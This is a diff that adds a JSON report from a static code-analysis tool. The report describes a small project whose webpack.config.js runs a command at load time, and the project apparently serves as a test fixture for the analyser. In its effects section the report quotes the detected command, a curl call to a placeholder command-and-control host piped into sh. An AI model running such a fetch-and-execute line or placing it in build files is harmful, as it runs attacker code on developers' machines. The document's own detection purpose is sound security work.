@@ -1,0 +1,514 @@
+{
+  "header": {
+    "schema": 3,
+    "engine": "forge-analysis 0.0.1",
+    "catalog_sha256": "661ff253d0997c290715b16d7de935041072e290e1efd30a82fa0c75eed0949b",
+    "snapshot_sha256": "67ad2eaa6f3a51928e30f0e85cf3d8703638ca4c4401c729fc715f724c742e3f",
+    "mode": "static_only",
+    "scope": "quick"
+  },
+  "index": [
+    {
+      "section": "overview",
+      "number": 1,
+      "title": "Overview",
+      "explanation": "What was analysed, whether the picture is complete, and one count for everything we could not see.",
+      "count": null,
+      "anchor": "overview"
+    },
+    {
+      "section": "entry_points",
+      "number": 2,
+      "title": "Entry points",
+      "explanation": "What runs first: runtime and install entry files, and declared entries that do not match any analysed file.",
+      "count": 1,
+      "anchor": "entry-points"
+    },
+    {
+      "section": "timeline",
+      "number": 3,
+      "title": "Execution timeline",
+      "explanation": "When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.",
+      "count": 1,
+      "anchor": "execution-timeline"
+    },
+    {
+      "section": "effects",
+      "number": 4,
+      "title": "Effects",
+      "explanation": "What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.",
+      "count": 1,
+      "anchor": "effects"
+    },
+    {
+      "section": "flows",
+      "number": 5,
+      "title": "Data flows",
+      "explanation": "Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.",
+      "count": 0,
+      "anchor": "data-flows"
+    },
+    {
+      "section": "scripts",
+      "number": 6,
+      "title": "Install scripts and shell commands",
+      "explanation": "Every package.json script, when it runs, and the commands inside it that we could not follow.",
+      "count": 0,
+      "anchor": "install-scripts-and-shell-commands"
+    },
+    {
+      "section": "dependencies",
+      "number": 7,
+      "title": "Dependencies",
+      "explanation": "Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.",
+      "count": 0,
+      "anchor": "dependencies"
+    },
+    {
+      "section": "unresolved",
+      "number": 8,
+      "title": "Unresolved",
+      "explanation": "Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.",
+      "count": 0,
+      "anchor": "unresolved"
+    },
+    {
+      "section": "unlinked",
+      "number": 9,
+      "title": "Unlinked imports",
+      "explanation": "Imports we could not follow to their source: packages, missing files and names that are not exported.",
+      "count": 0,
+      "anchor": "unlinked-imports"
+    },
+    {
+      "section": "not_analysed",
+      "number": 10,
+      "title": "Not analysed",
+      "explanation": "Files and folders that were not read as code, by kind, and anything skipped by a limit.",
+      "count": 17,
+      "anchor": "not-analysed"
+    },
+    {
+      "section": "functions",
+      "number": 11,
+      "title": "Function index",
+      "explanation": "Every function with its lanes, effects, callers and the facts inside it.",
+      "count": 1,
+      "anchor": "function-index"
+    }
+  ],
+  "overview": {
+    "files_analysed": 1,
+    "files_not_analysed": 17,
+    "functions": 1,
+    "facts": 3,
+    "links_made": 0,
+    "unresolved_cleared_by_links": 0,
+    "completeness": "incomplete",
+    "coverage": [
+      {
+        "section": "unresolved",
+        "label": "places where static analysis cannot say what happens",
+        "count": 0
+      },
+      {
+        "section": "unlinked",
+        "label": "imports not followed to their source",
+        "count": 0
+      },
+      {
+        "section": "entry_points",
+        "label": "declared entry points that match no analysed file",
+        "count": 0
+      },
+      {
+        "section": "not_analysed",
+        "label": "files or folders not read as code",
+        "count": 17
+      },
+      {
+        "section": "dependencies",
+        "label": "dependencies whose own code and install scripts were not analysed",
+        "count": 0
+      },
+      {
+        "section": "functions",
+        "label": "calls whose target we could not see (no function followed, no fact)",
+        "count": 0
+      }
+    ],
+    "fact_counts": [
+      {
+        "kind": "entry",
+        "count": 0
+      },
+      {
+        "kind": "import",
+        "count": 1
+      },
+      {
+        "kind": "call",
+        "count": 1
+      },
+      {
+        "kind": "effect",
+        "count": 1
+      },
+      {
+        "kind": "timer",
+        "count": 0
+      },
+      {
+        "kind": "lifecycle_script",
+        "count": 0
+      },
+      {
+        "kind": "dependency",
+        "count": 0
+      },
+      {
+        "kind": "unresolved",
+        "count": 0
+      },
+      {
+        "kind": "flow",
+        "count": 0
+      }
+    ],
+    "mirrored_output": [],
+    "unreached_functions": 0
+  },
+  "entry_points": {
+    "basis": "roots",
+    "runtime": [
+      {
+        "text": "webpack.config.js",
+        "truncated": false,
+        "original_len": 17,
+        "sha256": "1fb26bc12ac780c7ad7325730ed09fc4c2c3d757c276c3dacc44bfe20faf166f"
+      }
+    ],
+    "install": [],
+    "issues": []
+  },
+  "timeline": {
+    "lanes": [
+      {
+        "lane": "immediate",
+        "functions": [
+          {
+            "file": {
+              "text": "webpack.config.js",
+              "truncated": false,
+              "original_len": 17,
+              "sha256": "1fb26bc12ac780c7ad7325730ed09fc4c2c3d757c276c3dacc44bfe20faf166f"
+            },
+            "func": 0,
+            "name": null,
+            "line": 1
+          }
+        ]
+      }
+    ],
+    "timers": []
+  },
+  "effects": [
+    {
+      "effect": "process_spawn",
+      "items": [
+        {
+          "id": "fact:4bced2e6cc590d2f",
+          "at": {
+            "file": {
+              "text": "webpack.config.js",
+              "truncated": false,
+              "original_len": 17,
+              "sha256": "1fb26bc12ac780c7ad7325730ed09fc4c2c3d757c276c3dacc44bfe20faf166f"
+            },
+            "start_line": 1,
+            "end_line": 1,
+            "start_byte": 0,
+            "end_byte": 69
+          },
+          "detail": {
+            "text": "curl -s https://c2.example/i.sh | sh",
+            "truncated": false,
+            "original_len": 36,
+            "sha256": "1edeb4e06d0694ee9e9d37fbcc190091761ee5c2dcfeb703973367b3246056ad"
+          },
+          "url": null,
+          "in_fn": {
+            "file": {
+              "text": "webpack.config.js",
+              "truncated": false,
+              "original_len": 17,
+              "sha256": "1fb26bc12ac780c7ad7325730ed09fc4c2c3d757c276c3dacc44bfe20faf166f"
+            },
+            "func": 0,
+            "name": null,
+            "line": 1
+          },
+          "lanes": [
+            "immediate"
+          ],
+          "reachable": true
+        }
+      ]
+    }
+  ],
+  "flows": [],
+  "scripts": [],
+  "dependencies": [],
+  "unresolved": [],
+  "unlinked": [],
+  "package_calls": [],
+  "not_analysed": {
+    "groups": [
+      {
+        "kind": "auto_run_config",
+        "items": [
+          {
+            "path": {
+              "text": ".cargo/config.toml",
+              "truncated": false,
+              "original_len": 18,
+              "sha256": "9a4f3e4537ebb7474452d131b0d969d89a51286f4269aac5ef268e712be17268"
+            },
+            "size": 28,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": ".claude/settings.json",
+              "truncated": false,
+              "original_len": 21,
+              "sha256": "f27ac6f39d89fe021c56900069198aa7d9968f2cd6645c00b11ffd1b78fcf546"
+            },
+            "size": 80,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": ".devcontainer/devcontainer.json",
+              "truncated": false,
+              "original_len": 31,
+              "sha256": "24ad71c8613ddcf6fd23818cb3bb477a1fb6d83af4550b0bad43099813088686"
+            },
+            "size": 32,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": ".envrc",
+              "truncated": false,
+              "original_len": 6,
+              "sha256": "d33e979799a45c7c51752e9c8d96a3e452015d1a40b1e4b6ec6a98e92c4d8430"
+            },
+            "size": 11,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": ".husky/pre-commit",
+              "truncated": false,
+              "original_len": 17,
+              "sha256": "d2bc4bbf14eadc292d84e0ef5f7a93115c23557f533809fc80b896934291529d"
+            },
+            "size": 18,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": ".vscode/tasks.json",
+              "truncated": false,
+              "original_len": 18,
+              "sha256": "7d76d7533653c23b753fc7ce638cf64bdb5e419927d276af836d3a03fdf1745a"
+            },
+            "size": 100,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "Cargo.toml",
+              "truncated": false,
+              "original_len": 10,
+              "sha256": "2e9d962a08321605940b5a657135052fbcef87b5e360662bb527c96d9a615542"
+            },
+            "size": 21,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "Gemfile",
+              "truncated": false,
+              "original_len": 7,
+              "sha256": "d09ea66f8227784ff4393d88a19836f321c915ae10031d16c93d67e6283ab55f"
+            },
+            "size": 30,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "Makefile",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "76ed074a9305c04054cdebb9e9aad2d818052b07091de1f20cad0bbac34ffb52"
+            },
+            "size": 14,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "build.rs",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "d0d98998092552a1d3259338c2c71e118a5b8343dd4703c0c7f552ada7f9cb42"
+            },
+            "size": 13,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "composer.json",
+              "truncated": false,
+              "original_len": 13,
+              "sha256": "d2ab9925cad7eac58e0ff4cc0d251a937ecf49e4b6bf57f8b95aab76648a9d34"
+            },
+            "size": 43,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "pom.xml",
+              "truncated": false,
+              "original_len": 7,
+              "sha256": "9c5fb3d1b7e3b0f54bc5c4182965c4fe1f9023d449017cece3005d3f90e8e4d8"
+            },
+            "size": 11,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "setup.py",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "60f61ab7a8d1910d86d9fda2261620314edcae5894d5aaa236b821c7256badd7"
+            },
+            "size": 27,
+            "kind": "auto_run_config"
+          },
+          {
+            "path": {
+              "text": "venv/pyvenv.cfg",
+              "truncated": false,
+              "original_len": 15,
+              "sha256": "1da1691e79f01938d280502610d5e64a64ca71ef6efaa9fa5addbc4a8082843b"
+            },
+            "size": 19,
+            "kind": "auto_run_config"
+          }
+        ]
+      },
+      {
+        "kind": "other_file",
+        "items": [
+          {
+            "path": {
+              "text": "docs/notes.md",
+              "truncated": false,
+              "original_len": 13,
+              "sha256": "327ffd98a1f7c7084535515e3190e95b48a5b718f63232916279e113f507af2a"
+            },
+            "size": 8,
+            "kind": "other_file"
+          },
+          {
+            "path": {
+              "text": "tsconfig.json",
+              "truncated": false,
+              "original_len": 13,
+              "sha256": "b55cdbef4907b7045f32cc5360d48d262cca5f94062e353089f189f4460039e0"
+            },
+            "size": 23,
+            "kind": "other_file"
+          }
+        ]
+      },
+      {
+        "kind": "out_of_scope",
+        "items": [
+          {
+            "path": {
+              "text": "src/app.js",
+              "truncated": false,
+              "original_len": 10,
+              "sha256": "c72a907ac323cd2f334ed0e2bd07d15ab62581c4753660c8a0d1c681b30be4b6"
+            },
+            "size": 20,
+            "kind": "out_of_scope"
+          }
+        ]
+      }
+    ],
+    "unrecorded": 0
+  },
+  "functions": {
+    "functions": [
+      {
+        "at": {
+          "file": {
+            "text": "webpack.config.js",
+            "truncated": false,
+            "original_len": 17,
+            "sha256": "1fb26bc12ac780c7ad7325730ed09fc4c2c3d757c276c3dacc44bfe20faf166f"
+          },
+          "start_line": 1,
+          "end_line": 1,
+          "start_byte": 0,
+          "end_byte": 71
+        },
+        "file": {
+          "text": "webpack.config.js",
+          "truncated": false,
+          "original_len": 17,
+          "sha256": "1fb26bc12ac780c7ad7325730ed09fc4c2c3d757c276c3dacc44bfe20faf166f"
+        },
+        "func": 0,
+        "name": null,
+        "lanes": [
+          "immediate"
+        ],
+        "reachable_from_entry": true,
+        "escapes": false,
+        "direct_effects": [
+          {
+            "effect": "process_spawn",
+            "fact": "fact:4bced2e6cc590d2f"
+          }
+        ],
+        "transitive_effects": [
+          "process_spawn"
+        ],
+        "unresolved": [],
+        "unfollowed_calls": 2,
+        "calls_followed_across_files": 0,
+        "calls_matched_to_a_fact": 2,
+        "calls_not_traced": 0,
+        "untraced_calls": [],
+        "calls_into_packages": [],
+        "calls": [],
+        "callbacks": [],
+        "called_from": [],
+        "followed_calls": [],
+        "followed_called_from": [],
+        "facts": [
+          "fact:668cafc63fc08e1c",
+          "fact:baa3b1dceff07ff8",
+          "fact:4bced2e6cc590d2f"
+        ]
+      }
+    ],
+    "untraced_by_callee": [],
+    "unplaced_facts": []
+  }
+}
